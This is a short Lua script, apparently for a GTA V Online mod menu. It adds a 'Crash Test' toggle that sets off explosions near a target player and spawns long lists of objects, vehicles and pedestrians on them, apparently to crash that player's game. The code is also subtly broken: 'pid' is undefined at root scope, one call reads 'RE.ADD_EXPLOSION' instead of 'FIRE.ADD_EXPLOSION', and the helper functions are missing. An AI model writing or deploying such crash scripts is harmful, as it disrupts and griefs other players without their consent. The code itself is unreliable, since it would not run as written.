
util.keep_running()

menu.toggle_loop(menu.my_root(), ">> Crash Test", {"attachallnearby"}, "be careful...", function(on)
    local countdown = 4.50  
    menu.trigger_commands("tpcayoperico")
    if players.is_in_interior(pid) then
      return notification("The player is in interior", red)
    end
  
    local pos = players.get_pos(pid)
    FIRE.ADD_EXPLOSION(pos.x, pos.y + 65.5, pos.z + 10.0, 82, 10, true, false, 1, false)
  
    local objects = {2087304222, 1193759130, 1964400974, 1994282598, 1543408104, -465246693, -177141645, 434950506, -124033353, 103179737, 925058130, 2140733815, -1498244144, 1476149726, 2088303372, 785676028, 616522692, -1719442365, -1741901560, -2068583636, 231325255, 643649573, 500687632, -1580866404, 928394347, 1446045988, 1609878359}
    for _, object in pairs(objects) do
      give_object1(pid, object)
    end
    
    RE.ADD_EXPLOSION(pos.x, pos.y + 65.5, pos.z + 10.0, 82, 10, true, false, 1, false)
  
    local vehicles = {util.joaat("alkonost"), util.joaat("alkonost"), util.joaat("tug"), util.joaat("tug"), util.joaat("alkonost"), util.joaat("trailerlogs"), util.joaat("raketrailer"), util.joaat("trailers3")}
    for _, vehicle in pairs(vehicles) do
      give_vehicle1(pid, vehicle)
    end
  
    local peds = {1057201338, 1057201338, 1057201338, -2056455422, -1323586730, -1323586730, 1057201338, 1057201338, 1057201338, -2056455422, -1323586730, -1323586730, 1057201338, 1057201338, 1057201338, -2056455422, -1323586730, -1323586730, -1323586730}
    for _, ped in pairs(peds) do
      give_ped1(pid, ped)
    end
  end)

util.on_stop(function()
end)
  